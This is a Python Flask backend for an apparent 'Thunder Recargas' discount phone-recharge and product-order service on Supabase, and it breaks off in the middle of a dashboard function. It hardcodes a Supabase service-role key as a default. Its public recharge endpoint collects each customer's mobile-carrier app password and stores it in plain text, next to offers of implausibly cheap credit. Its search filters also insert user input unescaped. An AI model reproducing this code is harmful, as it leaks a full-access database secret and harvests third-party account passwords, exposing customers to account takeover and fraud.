import os
import json
import time
import csv
import io
import uuid
from datetime import datetime, timedelta
import pytz
from flask import Flask, request, jsonify, Response
from flask_cors import CORS
from functools import wraps
from supabase import create_client, Client
from dotenv import load_dotenv
import threading
from decimal import Decimal

# Carregar variáveis de ambiente
load_dotenv()

# --- INICIALIZAÇÃO E CONFIGURAÇÃO DA APLICAÇÃO ---
app = Flask(__name__)
CORS(app)

# --- CONFIGURAÇÃO SUPABASE ---
SUPABASE_URL = os.environ.get('SUPABASE_URL', 'https://pcbtgvdcihowmtmqzhns.supabase.co')
SUPABASE_KEY = os.environ.get('SUPABASE_KEY', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBjYnRndmRjaWhvd210bXF6aG5zIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc2MzIyODk1OSwiZXhwIjoyMDc4ODA0OTU5fQ.2F5YFviXUv5LeQmNKvPgiVAHmeioJ_3ro9K8enZxVsM')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD')

# Inicializar cliente Supabase
try:
    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
    supabase_connected = True
except Exception as e:
    print(f"Erro ao conectar ao Supabase: {e}")
    supabase_connected = False
    supabase = None

VALID_OPERATORS = ['tim', 'vivo', 'claro']
VALID_STATUSES = ['Processamento', 'Revisando', 'Concluido', 'Entregue', 'Erro', 'Aguarde até 24Horas']
PRODUCTS_TABLE = 'produtos'
CATEGORIAS_TABLE = 'categorias'
PEDIDOS_TABLE = 'pedidos_produtos'

# Cache para reduzir consultas ao banco
config_cache = None
config_cache_time = 0
CACHE_DURATION = 30  # segundos

# Variável para controlar estado do servidor
server_awake = True

# --- FUNÇÕES AUXILIARES SUPABASE ---

def get_cached_config():
    """Busca configuração com cache"""
    global config_cache, config_cache_time
    
    current_time = time.time()
    if config_cache and (current_time - config_cache_time) < CACHE_DURATION:
        return config_cache
    
    if not supabase_connected:
        return get_default_config()
    
    try:
        response = supabase.table('config').select('*').eq('id', 1).execute()
        if response.data and len(response.data) > 0:
            config_cache = response.data[0].get('data', get_default_config())
            config_cache_time = current_time
            return config_cache
        return get_default_config()
    except Exception as e:
        print(f"Erro ao buscar configuração: {e}")
        return get_default_config()

def get_default_config():
    """Configuração padrão caso falhe o Supabase"""
    return {
        "pageTitle": "Thunder Recargas",
        "headerTitle": "Thunder Recargas",
        "headerSubtitle": "Recargas promocionais com segurança e PIX",
        "pixKey": "82999158412",
        "pixName": "Jeferson",
        "pixCity": "SAO PAULO",
        "rechargeOptions": {
            "Vivo": ["R$35,00 PAGA R$25,00", "R$40,00 PAGA R$38,00", "R$50,00 PAGA R$20,00"],
            "Claro": ["R$20,00 PAGA R$15,00", "R$25,00 PAGA R$20,00", "R$30,00 PAGA R$22,00", 
                     "R$35,00 PAGA R$25,00", "R$40,00 PAGA R$30,00", "R$50,00 PAGA R$35,00"],
            "Tim": ["R$15,00 PAGA R$10,00", "R$20,00 PAGA R$15,00", "R$30,00 PAGA R$20,00", "R$40,00 PAGA R$30,00"]
        },
        "footerWarning": "Atenção: As recargas promocionais podem levar até 24 horas para serem creditadas em sua linha após a confirmação do pagamento.",
        "footerCopyright": "© 2025 Thunder Recargas. Todos os direitos reservados."
    }

def save_config(config_data):
    """Salva configuração no Supabase"""
    global config_cache, config_cache_time
    
    if not supabase_connected:
        return False
    
    try:
        response = supabase.table('config').upsert({
            'id': 1,
            'data': config_data,
            'updated_at': datetime.now(pytz.timezone('America/Sao_Paulo')).isoformat()
        }).execute()
        
        if response.data:
            config_cache = config_data
            config_cache_time = time.time()
            return True
        return False
    except Exception as e:
        print(f"Erro ao salvar configuração: {e}")
        return False

def get_categories():
    """Busca todas as categorias"""
    if not supabase_connected:
        return []
    
    try:
        response = supabase.table(CATEGORIAS_TABLE).select('*').order('nome').execute()
        return response.data
    except Exception as e:
        print(f"Erro ao buscar categorias: {e}")
        return []

def get_products(active_only=True):
    """Busca todos os produtos"""
    if not supabase_connected:
        return []
    
    try:
        query = supabase.table(PRODUCTS_TABLE).select('*')
        if active_only:
            query = query.eq('ativo', True)
        query = query.order('nome')
        response = query.execute()
        return response.data
    except Exception as e:
        print(f"Erro ao buscar produtos: {e}")
        return []

def get_product_by_id(product_id):
    """Busca um produto específico"""
    if not supabase_connected:
        return None
    
    try:
        response = supabase.table(PRODUCTS_TABLE).select('*').eq('id', product_id).execute()
        if response.data and len(response.data) > 0:
            return response.data[0]
        return None
    except Exception as e:
        print(f"Erro ao buscar produto: {e}")
        return None

# --- FUNÇÃO DE AUTENTICAÇÃO DO ADMIN ---
def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth_password = request.headers.get('Authorization')
        if not auth_password or auth_password != ADMIN_PASSWORD:
            return jsonify({'message': 'Acesso negado.'}), 401
        return f(*args, **kwargs)
    return decorated_function

# --- ROTAS DA API ---

@app.route('/health', methods=['GET'])
def health_check():
    """Endpoint de saúde para manter o servidor acordado"""
    global server_awake
    server_awake = True
    
    # Verificar conexão com Supabase
    db_status = "connected" if supabase_connected else "disconnected"
    
    return jsonify({
        'status': 'awake',
        'timestamp': datetime.now(pytz.timezone('America/Sao_Paulo')).isoformat(),
        'service': 'thunder-recargas',
        'database': db_status,
        'uptime': time.time() - app_start_time
    }), 200

@app.route('/wakeup', methods=['GET'])
def wakeup_server():
    """Endpoint específico para acordar o servidor rapidamente"""
    global server_awake
    server_awake = True
    
    # Fazer uma consulta leve ao Supabase para verificar conexão
    try:
        supabase.table('config').select('id').limit(1).execute()
        db_status = "connected"
    except:
        db_status = "disconnected"
    
    return jsonify({
        'status': 'awake',
        'message': 'Servidor ativado com sucesso',
        'timestamp': datetime.now().isoformat(),
        'database': db_status
    }), 200

@app.route('/', methods=['GET'])
def index():
    """Endpoint raiz para manter servidor ativo"""
    return jsonify({
        'service': 'Thunder Recargas API',
        'version': '2.0',
        'status': 'online',
        'timestamp': datetime.now().isoformat()
    }), 200

@app.route('/api/config', methods=['GET'])
def get_config():
    """Fornece os dados de configuração para a página do cliente"""
    try:
        config_data = get_cached_config()
        return jsonify(config_data), 200
    except Exception as e:
        print(f"Erro no get_config: {e}")
        return jsonify(get_default_config()), 200

@app.route('/api/admin/config', methods=['PUT'])
@admin_required
def update_config():
    """Salva as alterações feitas pelo admin no painel de configurações"""
    try:
        new_config_data = request.get_json()
        
        if save_config(new_config_data):
            return jsonify({'message': 'Configurações salvas com sucesso!'}), 200
        return jsonify({'message': 'Erro ao salvar configurações.'}), 500
        
    except Exception as e:
        print(f"Erro no update_config: {e}")
        return jsonify({'message': 'Erro ao salvar as configurações.'}), 500

@app.route('/api/recarregar', methods=['POST'])
def handle_recharge():
    """Rota para criar nova recarga"""
    data = request.get_json()
    operadora = (data.get('operadora') or '').lower()
    
    if operadora not in VALID_OPERATORS:
        return jsonify({'message': f'Operadora inválida.'}), 400
    
    try:
        if not supabase_connected:
            return jsonify({'message': 'Sistema temporariamente indisponível. Tente novamente em alguns segundos.'}), 503
        
        novo_pedido = {
            "timestamp": datetime.now(pytz.timezone('America/Sao_Paulo')).isoformat(),
            "nome": data.get('nome'),
            "telefone": data.get('telefone'),
            "operadora": data.get('operadora'),
            "recarga_selecionada": data.get('recarga_selecionada'),
            "senha_app": data.get('senha_tim') or data.get('senha_vivo') or data.get('senha_claro'),
            "status": "na-fila",
            "admin_comment": "",
            "created_at": datetime.now(pytz.timezone('America/Sao_Paulo')).isoformat()
        }
        
        response = supabase.table('recargas').insert(novo_pedido).execute()
        
        if response.data:
            return jsonify({'message': 'Sua solicitação foi registrada com sucesso!'}), 201
        else:
            return jsonify({'message': 'Erro ao salvar pedido.'}), 500
            
    except Exception as e:
        print(f"Erro no handle_recharge: {e}")
        return jsonify({'message': 'Erro no servidor. Por favor, tente novamente.'}), 500

# Rotas de gerenciamento de pedidos (admin)
@app.route('/api/admin/recargas', methods=['GET'])
@admin_required
def get_all_recargas():
    """Busca todas as recargas com filtros e paginação"""
    try:
        if not supabase_connected:
            return jsonify({'message': 'Banco de dados não conectado.'}), 500
        
        # Parâmetros de filtro
        page = int(request.args.get('page', 1))
        limit = int(request.args.get('limit', 10))
        offset = (page - 1) * limit
        
        # Construir query base
        query = supabase.table('recargas').select('*', count='exact')
        
        # Aplicar filtros
        search = request.args.get('search')
        if search:
            query = query.or_(f"nome.ilike.%{search}%,telefone.ilike.%{search}%")
        
        status = request.args.get('status')
        if status:
            query = query.eq('status', status)
        
        operadora = request.args.get('operadora')
        if operadora:
            query = query.eq('operadora', operadora)
        
        # Filtro por data
        date_start = request.args.get('dateStart')
        date_end = request.args.get('dateEnd')
        if date_start and date_end:
            query = query.gte('timestamp', date_start).lte('timestamp', date_end)
        elif request.args.get('period'):
            period = request.args.get('period')
            today = datetime.now(pytz.timezone('America/Sao_Paulo')).date()
            
            if period == 'today':
                query = query.gte('timestamp', today.isoformat())
            elif period == 'week':
                week_start = today - timedelta(days=today.weekday())
                query = query.gte('timestamp', week_start.isoformat())
            elif period == 'month':
                month_start = today.replace(day=1)
                query = query.gte('timestamp', month_start.isoformat())
        
        # Ordenação e paginação
        query = query.order('timestamp', desc=True).range(offset, offset + limit - 1)
        
        response = query.execute()
        
        total = response.count if hasattr(response, 'count') else len(response.data)
        
        return jsonify({
            'data': response.data,
            'total': total,
            'page': page,
            'limit': limit,
            'total_pages': (total + limit - 1) // limit if total else 1
        }), 200
        
    except Exception as e:
        print(f"Erro no get_all_recargas: {e}")
        return jsonify({'message': 'Falha ao buscar dados.'}), 500

@app.route('/api/admin/recargas/<recarga_id>', methods=['PUT'])
@admin_required
def update_recarga(recarga_id):
    """Atualiza uma recarga específica"""
    try:
        if not supabase_connected:
            return jsonify({'message': 'Banco de dados não conectado.'}), 500
        
        update_data = request.get_json()
        response = supabase.table('recargas').update(update_data).eq('id', recarga_id).execute()
        
        if response.data:
            return jsonify({
                'message': 'Recarga atualizada com sucesso!',
                'recarga': response.data[0]
            }), 200
        return jsonify({'message': 'Recarga com este ID não foi encontrada.'}), 404
        
    except Exception as e:
        print(f"Erro no update_recarga: {e}")
        return jsonify({'message': 'Falha ao atualizar a recarga.'}), 500

@app.route('/api/admin/recargas/<recarga_id>', methods=['DELETE'])
@admin_required
def delete_recarga(recarga_id):
    """Exclui uma recarga"""
    try:
        if not supabase_connected:
            return jsonify({'message': 'Banco de dados não conectado.'}), 500
        
        response = supabase.table('recargas').delete().eq('id', recarga_id).execute()
        
        if response.data:
            return jsonify({'message': 'Recarga excluída com sucesso!'}), 200
        return jsonify({'message': 'Recarga com este ID não foi encontrada.'}), 404
        
    except Exception as e:
        print(f"Erro no delete_recarga: {e}")
        return jsonify({'message': 'Falha ao excluir a recarga.'}), 500

@app.route('/api/admin/dashboard', methods=['GET'])
@admin_required
def get_dashboard_data():
    """Dados para o dashboard admin"""
    try:
        if not supabase_connected:
            return jsonify({
                'total': 0,
                'statusCounts': {'recarga-efetuada': 0, 'sendo-processada': 0, 'na-fila': 0, 'erro': 0},
                'operatorCounts': {'Tim': 0, 'Vivo': 0, 'Claro': 0},
                'variations': {'total': 0, 'completed': 0, 'pending': 0, 'error': 0}
            }), 200
        
        # Total de pedidos
        total_response = supabase.table('recargas').select('*', count='exact').execute()
        total = total_response.count if hasattr(total_response, 'count') else 0
        
        # Contagem por status
        status_response = supabase.table('recargas').select('status').execute()
        status_counts = {'recarga-efetuada': 0, 'sendo-processada': 0, 'na-fila': 0, 'erro': 0}
        
        for item in status_response.data:
            status = item.get('status')
            if status in status_counts:
                status_counts[status] += 1
        
        # Contagem por operadora
        operator_response = supabase.table('recargas').select('operadora').execute()
        operator_counts = {'Tim': 0, 'Vivo': 0, 'Claro': 0}
        
        for item in operator_response.data:
            operator = item.get('operadora')
            if operator in operator_counts:
                operator_counts[operator] += 1
        
        # Variações (simplificado)
        variations = {
            'total': 0,
            'completed': 0,
            'pending': 0,
            'error': 0
        }
        
        return jsonify({
            'total': total,
            'statusCounts': status_counts,
            'operatorCounts': operator_counts,
            'variations': variations
        }), 200
        
    except Exception as e:
        print(f"Erro no get_dashboard_data: {e}")
        return jsonify({'message': 'Falha ao buscar dados do dashboard.'}), 500

@app.route('/api/admin/export', methods=['GET'])
@admin_required
def export_data():
    """Exporta dados em diferentes formatos"""
    try:
        if not supabase_connected:
            return jsonify({'message': 'Banco de dados não conectado.'}), 500
        
        format_type = request.args.get('format', 'csv')
        
        # Buscar todos os dados
        response = supabase.table('recargas').select('*').order('timestamp', desc=True).execute()
        
        if format_type == 'csv':
            output = io.StringIO()
            writer = csv.writer(output, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
            
            # Cabeçalho
            if response.data and len(response.data) > 0:
                headers = list(response.data[0].keys())
                writer.writerow(headers)
                
                # Dados
                for row in response.data:
                    writer.writerow([row.get(key, '') for key in headers])
            
            output.seek(0)
            return Response(
                output.getvalue(),
                mimetype='text/csv',
                headers={'Content-Disposition': f'attachment; filename=recargas_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'}
            )
            
        elif format_type == 'excel':
            # Para Excel, retornamos CSV (simplificado)
            output = io.StringIO()
            writer = csv.writer(output, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
            
            if response.data and len(response.data) > 0:
                headers = list(response.data[0].keys())
                writer.writerow(headers)
                
                for row in response.data:
                    writer.writerow([row.get(key, '') for key in headers])
            
            output.seek(0)
            return Response(
                output.getvalue(),
                mimetype='text/csv',
                headers={'Content-Disposition': f'attachment; filename=recargas_{datetime.now().strftime("%Y%m%d_%H%M%S")}.xlsx'}
            )
            
        elif format_type == 'json':
            return jsonify(response.data), 200
            
        else:
            return jsonify({'message': 'Formato não suportado.'}), 400
            
    except Exception as e:
        print(f"Erro no export_data: {e}")
        return jsonify({'message': 'Falha ao exportar dados.'}), 500

@app.route('/api/admin/recargas', methods=['POST'])
@admin_required
def create_recarga():
    """Cria uma nova recarga pelo admin"""
    try:
        if not supabase_connected:
            return jsonify({'message': 'Banco de dados não conectado.'}), 500
        
        new_data = request.get_json()
        
        # Adicionar timestamp
        new_data['timestamp'] = datetime.now(pytz.timezone('America/Sao_Paulo')).isoformat()
        if 'status' not in new_data:
            new_data['status'] = 'na-fila'
        
        response = supabase.table('recargas').insert(new_data).execute()
        
        if response.data:
            return jsonify({
                'message': 'Novo pedido adicionado com sucesso!',
                'recarga': response.data[0]
            }), 201
        return jsonify({'message': 'Erro ao criar pedido.'}), 500
        
    except Exception as e:
        print(f"Erro no create_recarga: {e}")
        return jsonify({'message': 'Falha ao criar recarga.'}), 500

# --- ROTAS PARA PRODUTOS (PÚBLICAS) ---

@app.route('/api/produtos', methods=['GET'])
def listar_produtos():
    """Lista todos os produtos ativos"""
    try:
        categoria_id = request.args.get('categoria')
        search = request.args.get('search', '')
        
        if not supabase_connected:
            return jsonify([]), 200
        
        query = supabase.table(PRODUCTS_TABLE).select('*').eq('ativo', True)
        
        if categoria_id and categoria_id != 'all':
            query = query.eq('categoria_id', categoria_id)
        
        if search:
            query = query.or_(f"nome.ilike.%{search}%,descricao.ilike.%{search}%")
        
        response = query.order('nome').execute()
        
        # Buscar informações das categorias
        produtos = response.data
        categorias_response = supabase.table(CATEGORIAS_TABLE).select('*').execute()
        categorias = {cat['id']: cat for cat in categorias_response.data}
        
        for produto in produtos:
            categoria_id = produto.get('categoria_id')
            if categoria_id and categoria_id in categorias:
                produto['categoria'] = categorias[categoria_id]
        
        return jsonify(produtos), 200
    except Exception as e:
        print(f"Erro no listar_produtos: {e}")
        return jsonify([]), 200

@app.route('/api/categorias', methods=['GET'])
def listar_categorias():
    """Lista todas as categorias"""
    try:
        categorias = get_categories()
        return jsonify(categorias), 200
    except Exception as e:
        print(f"Erro no listar_categorias: {e}")
        return jsonify([]), 200

@app.route('/api/produto/pedido', methods=['POST'])
def criar_pedido_produto():
    """Cria um novo pedido de produto"""
    try:
        data = request.get_json()
        
        if not supabase_connected:
            return jsonify({'message': 'Sistema temporariamente indisponível.'}), 503
        
        # Gerar código de rastreio único
        codigo_rastreio = f"TH{str(uuid.uuid4().int)[:8]}"
        
        novo_pedido = {
            "codigo_rastreio": codigo_rastreio,
            "timestamp": datetime.now(pytz.timezone('America/Sao_Paulo')).isoformat(),
            "nome": data.get('nome'),
            "telefone": data.get('telefone'),
            "produto_id": data.get('produto_id'),
            "quantidade": data.get('quantidade', 1),
            "valor_total": data.get('valor_total'),
            "status": "Processamento",
            "comentario": "",
            "endereco": data.get('endereco', ''),
            "observacao": data.get('observacao', ''),
            "created_at": datetime.now(pytz.timezone('America/Sao_Paulo')).isoformat()
        }
        
        response = supabase.table(PEDIDOS_TABLE).insert(novo_pedido).execute()
        
        if response.data:
            # Buscar informações do produto para retorno
            produto = get_product_by_id(data.get('produto_id'))
            pedido_completo = {**response.data[0], 'produto': produto}
            
            return jsonify({
                'message': 'Pedido criado com sucesso!',
                'pedido': pedido_completo,
                'codigo_rastreio': codigo_rastreio
            }), 201
        return jsonify({'message': 'Erro ao criar pedido.'}), 500
        
    except Exception as e:
        print(f"Erro no criar_pedido_produto: {e}")
        return jsonify({'message': 'Erro no servidor.'}), 500

@app.route('/api/consulta/pedido', methods=['GET'])
def consultar_pedido():
    """Consulta pedidos por telefone"""
    try:
        telefone = request.args.get('telefone')
        codigo = request.args.get('codigo')
        
        if not telefone and not codigo:
            return jsonify({'message': 'Informe telefone ou código de rastreio.'}), 400
        
        if not supabase_connected:
            return jsonify([]), 200
        
        query = supabase.table(PEDIDOS_TABLE).select('*')
        
        if telefone:
            query = query.eq('telefone', telefone)
        if codigo:
            query = query.eq('codigo_rastreio', codigo)
        
        response = query.order('timestamp', desc=True).execute()
        pedidos = response.data
        
        # Adicionar informações dos produtos
        for pedido in pedidos:
            produto = get_product_by_id(pedido.get('produto_id'))
            if produto:
                pedido['produto'] = produto
        
        return jsonify(pedidos), 200
        
    except Exception as e:
        print(f"Erro no consultar_pedido: {e}")
        return jsonify([]), 200

# --- ROTAS ADMINISTRATIVAS PARA PRODUTOS ---

@app.route('/api/admin/produtos', methods=['GET'])
@admin_required
def admin_listar_produtos():
    """Lista todos os produtos (admin)"""
    try:
        search = request.args.get('search', '')
        categoria_id = request.args.get('categoria_id')
        ativo = request.args.get('ativo')
        
        query = supabase.table(PRODUCTS_TABLE).select('*')
        
        if search:
            query = query.or_(f"nome.ilike.%{search}%,descricao.ilike.%{search}%")
        
        if categoria_id:
            query = query.eq('categoria_id', categoria_id)
        
        if ativo:
            query = query.eq('ativo', ativo == 'true')
        
        response = query.order('nome').execute()
        
        # Adicionar categorias
        produtos = response.data
        categorias_response = supabase.table(CATEGORIAS_TABLE).select('*').execute()
        categorias = {cat['id']: cat for cat in categorias_response.data}
        
        for produto in produtos:
            cat_id = produto.get('categoria_id')
            if cat_id and cat_id in categorias:
                produto['categoria'] = categorias[cat_id]
        
        return jsonify(produtos), 200
    except Exception as e:
        print(f"Erro no admin_listar_produtos: {e}")
        return jsonify([]), 500

@app.route('/api/admin/produtos', methods=['POST'])
@admin_required
def admin_criar_produto():
    """Cria um novo produto"""
    try:
        data = request.get_json()
        
        # Validação dos campos obrigatórios
        if not data:
            return jsonify({'message': 'Dados não fornecidos.'}), 400
            
        nome = data.get('nome')
        if not nome or not nome.strip():
            return jsonify({'message': 'O nome do produto é obrigatório.'}), 400
        
        preco = data.get('preco')
        if preco is None:
            return jsonify({'message': 'O preço do produto é obrigatório.'}), 400
        
        try:
            preco = float(preco)
        except ValueError:
            return jsonify({'message': 'O preço deve ser um número válido.'}), 400
        
        categoria_id = data.get('categoria_id')
        if not categoria_id:
            return jsonify({'message': 'A categoria do produto é obrigatória.'}), 400
        
        novo_produto = {
            "nome": nome.strip(),
            "descricao": data.get('descricao', '').strip(),
            "preco": preco,
            "categoria_id": categoria_id,
            "ativo": data.get('ativo', True),
            "imagem_url": data.get('imagem_url', '').strip(),
            "estoque": data.get('estoque', 0),
            "destaque": data.get('destaque', False),
            "created_at": datetime.now(pytz.timezone('America/Sao_Paulo')).isoformat()
        }
        
        response = supabase.table(PRODUCTS_TABLE).insert(novo_produto).execute()
        
        if response.data:
            return jsonify({
                'message': 'Produto criado com sucesso!',
                'produto': response.data[0]
            }), 201
        return jsonify({'message': 'Erro ao criar produto.'}), 500
        
    except Exception as e:
        print(f"Erro no admin_criar_produto: {e}")
        return jsonify({'message': 'Erro ao criar produto.'}), 500

@app.route('/api/admin/produtos/<produto_id>', methods=['PUT'])
@admin_required
def admin_atualizar_produto(produto_id):
    """Atualiza um produto"""
    try:
        data = request.get_json()
        
        # Validação se está atualizando o nome
        if 'nome' in data:
            nome = data.get('nome')
            if not nome or not nome.strip():
                return jsonify({'message': 'O nome do produto é obrigatório.'}), 400
            data['nome'] = nome.strip()
        
        if 'descricao' in data:
            data['descricao'] = data['descricao'].strip()
        
        if 'preco' in data:
            try:
                data['preco'] = float(data['preco'])
            except ValueError:
                return jsonify({'message': 'O preço deve ser um número válido.'}), 400
        
        if 'imagem_url' in data:
            data['imagem_url'] = data['imagem_url'].strip()
        
        response = supabase.table(PRODUCTS_TABLE).update(data).eq('id', produto_id).execute()
        
        if response.data:
            return jsonify({
                'message': 'Produto atualizado com sucesso!',
                'produto': response.data[0]
            }), 200
        return jsonify({'message': 'Produto não encontrado.'}), 404
        
    except Exception as e:
        print(f"Erro no admin_atualizar_produto: {e}")
        return jsonify({'message': 'Erro ao atualizar produto.'}), 500

@app.route('/api/admin/produtos/<produto_id>', methods=['DELETE'])
@admin_required
def admin_excluir_produto(produto_id):
    """Exclui um produto (marca como inativo)"""
    try:
        response = supabase.table(PRODUCTS_TABLE).update({'ativo': False}).eq('id', produto_id).execute()
        
        if response.data:
            return jsonify({'message': 'Produto excluído com sucesso!'}), 200
        return jsonify({'message': 'Produto não encontrado.'}), 404
        
    except Exception as e:
        print(f"Erro no admin_excluir_produto: {e}")
        return jsonify({'message': 'Erro ao excluir produto.'}), 500

# --- ROTAS ADMINISTRATIVAS PARA CATEGORIAS ---

@app.route('/api/admin/categorias', methods=['GET'])
@admin_required
def admin_listar_categorias():
    """Lista todas as categorias (admin)"""
    try:
        response = supabase.table(CATEGORIAS_TABLE).select('*').order('nome').execute()
        return jsonify(response.data), 200
    except Exception as e:
        print(f"Erro no admin_listar_categorias: {e}")
        return jsonify([]), 500

@app.route('/api/admin/categorias', methods=['POST'])
@admin_required
def admin_criar_categoria():
    """Cria uma nova categoria"""
    try:
        data = request.get_json()
        
        # Validação dos campos obrigatórios
        if not data:
            return jsonify({'message': 'Dados não fornecidos.'}), 400
            
        nome = data.get('nome')
        if not nome or not nome.strip():
            return jsonify({'message': 'O nome da categoria é obrigatório.'}), 400
        
        nova_categoria = {
            "nome": nome.strip(),
            "descricao": data.get('descricao', '').strip(),
            "ativo": data.get('ativo', True),
            "created_at": datetime.now(pytz.timezone('America/Sao_Paulo')).isoformat()
        }
        
        response = supabase.table(CATEGORIAS_TABLE).insert(nova_categoria).execute()
        
        if response.data:
            return jsonify({
                'message': 'Categoria criada com sucesso!',
                'categoria': response.data[0]
            }), 201
        return jsonify({'message': 'Erro ao criar categoria.'}), 500
        
    except Exception as e:
        print(f"Erro no admin_criar_categoria: {e}")
        return jsonify({'message': 'Erro ao criar categoria.'}), 500

@app.route('/api/admin/categorias/<categoria_id>', methods=['PUT'])
@admin_required
def admin_atualizar_categoria(categoria_id):
    """Atualiza uma categoria"""
    try:
        data = request.get_json()
        
        # Validação se está atualizando o nome
        if 'nome' in data:
            nome = data.get('nome')
            if not nome or not nome.strip():
                return jsonify({'message': 'O nome da categoria é obrigatório.'}), 400
            data['nome'] = nome.strip()
        
        if 'descricao' in data:
            data['descricao'] = data['descricao'].strip()
        
        response = supabase.table(CATEGORIAS_TABLE).update(data).eq('id', categoria_id).execute()
        
        if response.data:
            return jsonify({
                'message': 'Categoria atualizada com sucesso!',
                'categoria': response.data[0]
            }), 200
        return jsonify({'message': 'Categoria não encontrada.'}), 404
        
    except Exception as e:
        print(f"Erro no admin_atualizar_categoria: {e}")
        return jsonify({'message': 'Erro ao atualizar categoria.'}), 500

@app.route('/api/admin/categorias/<categoria_id>', methods=['DELETE'])
@admin_required
def admin_excluir_categoria(categoria_id):
    """Exclui uma categoria (marca como inativa)"""
    try:
        # Primeiro verificar se há produtos usando esta categoria
        produtos_response = supabase.table(PRODUCTS_TABLE).select('id').eq('categoria_id', categoria_id).eq('ativo', True).execute()
        
        if produtos_response.data and len(produtos_response.data) > 0:
            return jsonify({'message': 'Não é possível excluir. Existem produtos usando esta categoria.'}), 400
        
        response = supabase.table(CATEGORIAS_TABLE).update({'ativo': False}).eq('id', categoria_id).execute()
        
        if response.data:
            return jsonify({'message': 'Categoria excluída com sucesso!'}), 200
        return jsonify({'message': 'Categoria não encontrada.'}), 404
        
    except Exception as e:
        print(f"Erro no admin_excluir_categoria: {e}")
        return jsonify({'message': 'Erro ao excluir categoria.'}), 500

# --- ROTAS ADMINISTRATIVAS PARA PEDIDOS DE PRODUTOS ---

@app.route('/api/admin/pedidos/produtos', methods=['GET'])
@admin_required
def admin_listar_pedidos_produtos():
    """Lista todos os pedidos de produtos"""
    try:
        page = int(request.args.get('page', 1))
        limit = int(request.args.get('limit', 20))
        offset = (page - 1) * limit
        
        search = request.args.get('search')
        status = request.args.get('status')
        data_inicio = request.args.get('data_inicio')
        data_fim = request.args.get('data_fim')
        
        query = supabase.table(PEDIDOS_TABLE).select('*', count='exact')
        
        if search:
            query = query.or_(f"nome.ilike.%{search}%,telefone.ilike.%{search}%,codigo_rastreio.ilike.%{search}%")
        
        if status:
            query = query.eq('status', status)
        
        if data_inicio and data_fim:
            query = query.gte('timestamp', data_inicio).lte('timestamp', data_fim)
        
        query = query.order('timestamp', desc=True).range(offset, offset + limit - 1)
        response = query.execute()
        
        total = response.count if hasattr(response, 'count') else len(response.data)
        
        # Adicionar informações dos produtos
        pedidos = response.data
        for pedido in pedidos:
            produto = get_product_by_id(pedido.get('produto_id'))
            if produto:
                pedido['produto'] = produto
        
        return jsonify({
            'data': pedidos,
            'total': total,
            'page': page,
            'limit': limit,
            'total_pages': (total + limit - 1) // limit if total else 1
        }), 200
    except Exception as e:
        print(f"Erro no admin_listar_pedidos_produtos: {e}")
        return jsonify({'data': [], 'total': 0, 'page': 1, 'limit': 20, 'total_pages': 1}), 500

@app.route('/api/admin/pedidos/produtos/<pedido_id>', methods=['PUT'])
@admin_required
def admin_atualizar_pedido_produto(pedido_id):
    """Atualiza um pedido de produto"""
    try:
        data = request.get_json()
        
        # Validar status
        if 'status' in data and data['status'] not in VALID_STATUSES:
            return jsonify({'message': 'Status inválido.'}), 400
        
        response = supabase.table(PEDIDOS_TABLE).update(data).eq('id', pedido_id).execute()
        
        if response.data:
            return jsonify({
                'message': 'Pedido atualizado com sucesso!',
                'pedido': response.data[0]
            }), 200
        return jsonify({'message': 'Pedido não encontrado.'}), 404
        
    except Exception as e:
        print(f"Erro no admin_atualizar_pedido_produto: {e}")
        return jsonify({'message': 'Erro ao atualizar pedido.'}), 500

@app.route('/api/admin/pedidos/produtos/<pedido_id>', methods=['DELETE'])
@admin_required
def admin_excluir_pedido_produto(pedido_id):
    """Exclui um pedido de produto"""
    try:
        response = supabase.table(PEDIDOS_TABLE).delete().eq('id', pedido_id).execute()
        
        if response.data:
            return jsonify({'message': 'Pedido excluído com sucesso!'}), 200
        return jsonify({'message': 'Pedido não encontrado.'}), 404
        
    except Exception as e:
        print(f"Erro no admin_excluir_pedido_produto: {e}")
        return jsonify({'message': 'Erro ao excluir pedido.'}), 500

@app.route('/api/admin/dashboard/produtos', methods=['GET'])
@admin_required
def admin_dashboard_produtos():
    """Dashboard para produtos"""
    try:
        if not supabase_connected:
            return jsonify({
                'total_pedidos': 0,
                'total_vendas': 0,
                'status_counts': {},
                'top_produtos': [],
                'vendas_por_dia': [],
                'today_sales': 0,
                'week_sales': 0,
                'month_sales': 0,
                'average_ticket': 0,
                'total_products': 0,
                'total_categories': 0
            }), 200
        
        # Total de pedidos
        total_response = supabase.table(PEDIDOS_TABLE).select('*', count='exact').execute()
        total_pedidos = total_response.count if hasattr(total_response, 'count') else 0
        
        # Total de vendas
        vendas_response = supabase.table(PEDIDOS_TABLE).select('valor_total').execute()
        total_vendas = sum(float(pedido['valor_total'] or 0) for pedido in vendas_response.data)
        
        # Contagem por status
        status_response = supabase.table(PEDIDOS_TABLE).select('status').execute()
        status_counts = {}
        for item in status_response.data:
            status = item.get('status')
            status_counts[status] = status_counts.get(status, 0) + 1
        
        # Top produtos
        produtos_response = supabase.table(PEDIDOS_TABLE).select('produto_id').execute()
        produto_counts = {}
        for item in produtos_response.data:
            produto_id = item.get('produto_id')
            if produto_id:
                produto_counts[produto_id] = produto_counts.get(produto_id, 0) + 1
        
        top_produtos = []
        for produto_id, count in sorted(produto_counts.items(), key=lambda x: x[1], reverse=True)[:5]:
            produto = get_product_by_id(produto_id)
            if produto:
                top_produtos.append({
                    'produto': produto,
                    'vendas': count
                })
        
        # Vendas por dia (últimos 7 dias)
        hoje = datetime.now(pytz.timezone('America/Sao_Paulo')).date()
        vendas_por_dia = []
        for i in range(7):
            data = hoje - timedelta(days=i)
            data_str = data.isoformat()
            vendas_dia_response = supabase.table(PEDIDOS_TABLE).select('valor_total').gte('timestamp', data_str).lt('timestamp', (data + timedelta(days=1)).isoformat()).execute()
            total_dia = sum(float(pedido['valor_total'] or 0) for pedido in vendas_dia_response.data)
            vendas_por_dia.append({
                'data': data_str,
                'total': total_dia
            })
        vendas_por_dia.reverse()
        
        # Estatísticas de produtos
